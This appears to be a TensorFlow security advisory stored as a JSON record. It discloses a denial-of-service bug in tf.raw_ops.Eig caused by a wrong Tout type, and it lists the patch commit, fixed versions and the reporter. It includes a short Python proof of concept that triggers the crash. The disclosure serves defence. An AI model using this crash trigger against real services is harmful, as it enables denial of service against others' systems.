{"description": "### Impact\n`Eig` can be fed an incorrect `Tout` input, resulting in a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.complex128\narg_2=True\narg_3=''\ntf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aed36912609fc07229b4d0a7b44f3f48efc00fd0](https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by \u5218\u529b\u6e90, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n", "methods": ["None", "None", "None", "None"]}
